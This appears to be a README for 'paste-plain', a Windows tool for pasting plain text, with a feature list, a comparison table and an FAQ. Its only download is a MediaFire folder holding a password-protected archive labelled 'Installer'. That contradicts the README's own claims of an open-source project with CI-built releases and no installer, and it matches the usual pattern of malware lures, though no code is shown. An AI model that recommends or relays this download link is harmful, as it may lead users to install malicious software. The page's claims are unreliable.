# paste-plain

🪶 Free, open-source paste as plain text tool for Windows — universal hotkey strips formatting from any copy. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Universal plain paste** — Win+Alt+V pastes clipboard text without fonts, colors or links in any app
- ✅ **Auto-clean mode** — optionally converts every copy so plain text is the default behavior
- ✅ **Smart whitespace** — options to collapse blank lines and trim trailing spaces on paste
- ✅ **Rich-when-wanted exception list** — sender targets like editors can keep original formatting
- ✅ **No clipboard daemon** — runs in the tray, uses no history database, stores nothing
- ✅ **Works everywhere** — any control that accepts text, including remote sessions
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why paste-plain

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **paste-plain** | PureText | Ditto | Ctrl+Shift+V |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free, OSS | Built-in |
| Open source | **Yes** | No | Yes | No |
| Works in every app | **Yes** | Yes | Partial | App-dependent |
| No clipboard history stored | **Yes** | Yes | No | Yes |
| Whitespace cleanup options | **Yes** | No | Partial | No |
| Portable, no install | **Yes, 100 MB** | Zip | Installer | With OS |

## FAQ

**how to always paste as plain text on Windows?**

Ctrl+Shift+V exists only in some apps, so formatting keeps riding into tickets, emails and code fields. paste-plain binds a system-wide hotkey that pastes cleaned text into any control, or can auto-clean everything you copy. It stores no clipboard history at all and is a 100 MB portable exe under MIT.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark panel (#121418, mint #6EE7B7): hotkey recorder showing Win+Alt+V, auto-clean toggle on, whitespace options with checkboxes.
2. Exception manager: target list where formatting is preserved, add-app picker, priority order rows with drag handles.
3. Tray and log: recent paste events without content shown, privacy note card about storing nothing, startup toggle off.

## Download

| Source | Link |
|---|---|
| 💾 **Installer paste-plain** | [Installer paste-plain](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).